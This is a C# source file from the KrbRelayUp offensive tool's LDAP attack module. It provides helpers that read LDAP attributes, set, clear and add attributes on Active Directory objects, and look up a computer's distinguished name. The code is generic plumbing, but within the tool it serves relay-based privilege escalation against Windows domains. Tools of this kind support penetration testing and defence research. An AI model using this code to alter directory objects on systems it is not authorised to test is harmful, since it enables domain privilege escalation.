using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static KrbRelayUp.Relay.Natives;

namespace KrbRelayUp.Relay.Attacks.Ldap
{
    internal class Generic
    {
        public static Dictionary<string, List<byte[]>> GetLdapAttributes(IntPtr ld, IntPtr entry, ref IntPtr ber)
        {
            Dictionary<string, List<byte[]>> list = new Dictionary<string, List<byte[]>>();
            for (var attr = ldap_first_attribute(ld, entry, ref ber);
                attr != IntPtr.Zero;
                attr = ldap_next_attribute(ld, entry, ber))
            {
                var vals = ldap_get_values_len(ld, entry, attr);
                if (vals != IntPtr.Zero)
                {
                    var attrName = Marshal.PtrToStringUni(attr);
                    if (attrName != null)
                    {
                        list.Add(
                            attrName,
                            Helpers.BerValArrayToByteArrays(vals)
                        );
                    }
                    ldap_value_free_len(vals);
                }
            }
            return list;
        }

        public static string GetLdapDn(IntPtr ld, IntPtr entry)
        {
            var ptr = ldap_get_dn(ld, entry);
            var dn = Marshal.PtrToStringUni(ptr);
            return dn;
        }

        public static LdapStatus setAttribute(IntPtr ld, string attribute, byte[] value, string dn)
        {
            var modPropPtr = Marshal.StringToHGlobalUni(attribute);
            var modValue = new List<byte[]> {
                value
            };
            var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
            List<LDAPMod> mod = new List<LDAPMod> {
                new LDAPMod {
                    mod_op = (int)LdapModOperation.LDAP_MOD_REPLACE | (int)LdapModOperation.LDAP_MOD_BVALUES,
                    mod_type = modPropPtr,
                    mod_vals_u = new LDAPMod.mod_vals
                    {
                        modv_bvals = modValuePtr
                    },
                    mod_next = IntPtr.Zero
                }
            };
            var ptr = Marshal.AllocHGlobal(IntPtr.Size * 2); // alloc memory for list with last element null
            Helpers.StructureArrayToPtr(mod, ptr, true);

            //int rest = ldap_modify_ext(ld, dn, ptr, IntPtr.Zero, IntPtr.Zero, out int pMessage);
            int rest = ldap_modify_s(ld, dn, ptr);

            mod.ForEach(_ =>
            {
                Helpers.BerValuesFree(_.mod_vals_u.modv_bvals);
                Marshal.FreeHGlobal(_.mod_vals_u.modv_bvals);
                Marshal.FreeHGlobal(_.mod_type);
            });
            Marshal.FreeHGlobal(ptr);
            
            return (LdapStatus)rest;
        }

        public static LdapStatus clearAttribute(IntPtr ld, string attribute, string dn)
        {
            var modPropPtr = Marshal.StringToHGlobalUni(attribute);
            var modValue = new List<byte[]> {};
            var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
            List<LDAPMod> mod = new List<LDAPMod> {
                new LDAPMod {
                    mod_op = (int)LdapModOperation.LDAP_MOD_REPLACE | (int)LdapModOperation.LDAP_MOD_BVALUES,
                    mod_type = modPropPtr,
                    mod_vals_u = new LDAPMod.mod_vals
                    {
                        modv_bvals = modValuePtr
                    },
                    mod_next = IntPtr.Zero
                }
            };
            var ptr = Marshal.AllocHGlobal(IntPtr.Size * 2); // alloc memory for list with last element null
            Helpers.StructureArrayToPtr(mod, ptr, true);

            //int rest = ldap_modify_ext(ld, dn, ptr, IntPtr.Zero, IntPtr.Zero, out int pMessage);
            int rest = ldap_modify_s(ld, dn, ptr);
            Console.WriteLine("[*] ldap_clear: {0}", (LdapStatus)rest);

            mod.ForEach(_ =>
            {
                Helpers.BerValuesFree(_.mod_vals_u.modv_bvals);
                Marshal.FreeHGlobal(_.mod_vals_u.modv_bvals);
                Marshal.FreeHGlobal(_.mod_type);
            });
            Marshal.FreeHGlobal(ptr);

            return (LdapStatus)rest;
        }

        public static LdapStatus addAttribute(IntPtr ld, string attribute, byte[] value, string dn)
        {
            var modPropPtr = Marshal.StringToHGlobalUni(attribute);
            var modValue = new List<byte[]> {
                value
            };
            var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
            List<LDAPMod> mod = new List<LDAPMod> {
                new LDAPMod {
                    mod_op = (int)LdapModOperation.LDAP_MOD_ADD | (int)LdapModOperation.LDAP_MOD_BVALUES,
                    mod_type = modPropPtr,
                    mod_vals_u = new LDAPMod.mod_vals
                    {
                        modv_bvals = modValuePtr
                    },
                    mod_next = IntPtr.Zero
                }
            };
            var ptr = Marshal.AllocHGlobal(IntPtr.Size * 2); // alloc memory for list with last element null
            Helpers.StructureArrayToPtr(mod, ptr, true);

            //int rest = ldap_modify_ext(ld, dn, ptr, IntPtr.Zero, IntPtr.Zero, out int pMessage);
            int rest = ldap_modify_s(ld, dn, ptr);
            Console.WriteLine("[*] ldap_modify: {0}", (LdapStatus)rest);

            mod.ForEach(_ =>
            {
                Helpers.BerValuesFree(_.mod_vals_u.modv_bvals);
                Marshal.FreeHGlobal(_.mod_vals_u.modv_bvals);
                Marshal.FreeHGlobal(_.mod_type);
            });
            Marshal.FreeHGlobal(ptr);

            return (LdapStatus)rest;
        }

        public static string getMachineDN(IntPtr ld, string computername = null)
        {
            if (string.IsNullOrEmpty(computername))
            {
                computername = Environment.MachineName;
            }
            if (!computername.EndsWith("$"))
            {
                computername += "$";
            }
            var timeout = new LDAP_TIMEVAL
            {
                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
            };
            IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
            var controlPtr = Marshal.StringToHGlobalUni("DistinguishedName");
            Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
            var search = ldap_search(ld, $"{Options.domainDN}", (int)LdapSearchScope.LDAP_SCOPE_SUBTREE, $"(&(objectClass=computer)(sAMAccountName={computername}))", pLaps, 0);
            //Console.WriteLine("[*] msgID: {0}", search);

            IntPtr pMessage = IntPtr.Zero;
            var r = ldap_result(
                ld,
                search,
                0,
                timeout,
                ref pMessage);
            var entry = ldap_first_entry(ld, pMessage);
            IntPtr ber = IntPtr.Zero;
            var attr = ldap_first_attribute(ld, entry, ref ber);
            var vals = ldap_get_values_len(ld, entry, attr);
            var attrName = Marshal.PtrToStringUni(attr);
            //Console.WriteLine("ldap_first_attribute: {0}", attr);
            //Console.WriteLine("ldap_get_values_len: {0}", vals);
            //Console.WriteLine("attrName: {0}", attrName);

            var result = new List<byte[]>();
            foreach (var tempPtr in Helpers.GetPointerArray(vals))
            {
                berval bervalue = (berval)Marshal.PtrToStructure(tempPtr, typeof(berval));
                if (bervalue.bv_len > 0 && bervalue.bv_val != IntPtr.Zero)
                {
                    var byteArray = new byte[bervalue.bv_len];
                    Marshal.Copy(bervalue.bv_val, byteArray, 0, bervalue.bv_len);
                    result.Add(byteArray);
                }
            }
            byte[] t = result.SelectMany(a => a).ToArray();
            //Console.WriteLine("[+] {0}: {1}", attribute, Encoding.ASCII.GetString(t));

            Marshal.FreeHGlobal(controlPtr);
            return Encoding.UTF8.GetString(t);
            //return "";
        }

        public static string getPropertyValue(IntPtr ld, string adObject, string property)
        {
            var timeout = new LDAP_TIMEVAL
            {
                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
            };
            IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
            var controlPtr = Marshal.StringToHGlobalUni(property);
            Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
            var search = ldap_search(ld, $"{Options.domainDN}", (int)LdapSearchScope.LDAP_SCOPE_SUBTREE, $"(&(objectClass=*)(sAMAccountName={adObject}))", pLaps, 0);
            //Console.WriteLine("[*] msgID: {0}", search);

            IntPtr pMessage = IntPtr.Zero;
            var r = ldap_result(
                ld,
                search,
                0,
                timeout,
                ref pMessage);
            var entry = ldap_first_entry(ld, pMessage);
            IntPtr ber = IntPtr.Zero;
            var attr = ldap_first_attribute(ld, entry, ref ber);
            var vals = ldap_get_values_len(ld, entry, attr);
            var attrName = Marshal.PtrToStringUni(attr);
            //Console.WriteLine("ldap_first_attribute: {0}", attr);
            //Console.WriteLine("ldap_get_values_len: {0}", vals);
            //Console.WriteLine("attrName: {0}", attrName);

            var result = new List<byte[]>();
            foreach (var tempPtr in Helpers.GetPointerArray(vals))
            {
                berval bervalue = (berval)Marshal.PtrToStructure(tempPtr, typeof(berval));
                if (bervalue.bv_len > 0 && bervalue.bv_val != IntPtr.Zero)
                {
                    var byteArray = new byte[bervalue.bv_len];
                    Marshal.Copy(bervalue.bv_val, byteArray, 0, bervalue.bv_len);
                    result.Add(byteArray);
                }
            }
            byte[] t = result.SelectMany(a => a).ToArray();
            //Console.WriteLine("[+] {0}: {1}", attribute, Encoding.ASCII.GetString(t));

            Marshal.FreeHGlobal(controlPtr);
            return Encoding.UTF8.GetString(t);
        }
    }
}